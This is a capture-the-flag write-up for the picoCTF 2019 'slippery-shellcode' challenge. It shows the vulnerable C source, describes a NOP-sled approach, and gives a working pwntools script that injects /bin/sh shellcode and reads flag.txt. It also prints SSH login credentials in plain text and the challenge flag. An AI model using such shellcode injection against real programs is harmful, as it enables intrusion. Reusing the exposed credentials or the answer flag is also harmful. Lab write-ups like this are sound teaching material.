# Problem
This [program](https://2019shell1.picoctf.com/static/d8a216fff7df69807af854ffca65c16c/vuln) is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/slippery-shellcode_4_64839254839978b32eb661ca92071d48 on the shell server. [Source](https://2019shell1.picoctf.com/static/d8a216fff7df69807af854ffca65c16c/vuln.c).

## Hints:

## Solution:

Lets download the files:
```bash
wget https://2019shell1.picoctf.com/static/d8a216fff7df69807af854ffca65c16c/vuln
wget https://2019shell1.picoctf.com/static/d8a216fff7df69807af854ffca65c16c/vuln.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing from a random location now...");

  int offset = (rand() % 256) + 1;
  
  ((void (*)())(buf+offset))();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
```

We call ```buf```  with an offset of +- ```1``` to ```256```.

The strategy is to send a shellcode (with a [NOP sled](https://en.wikipedia.org/wiki/NOP_slide)).

Now lets write a simple python script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)

  s.set_working_directory('/problems/slippery-shellcode_4_64839254839978b32eb661ca92071d48')
  p = s.process('./vuln')

print p.recv()

sc = '\x90' * 256 + asm(shellcraft.i386.linux.sh())
log.info('Sending shellcode: {}'.format(sc))
p.sendline(sc)

if debug:
  p.interactive()
else:
  p.sendline('ls')
  p.sendline('cat flag.txt')
  p.sendline('exit')

  print p.recvall()
```

Flag: picoCTF{sl1pp3ry_sh311c0d3_3d79d4df}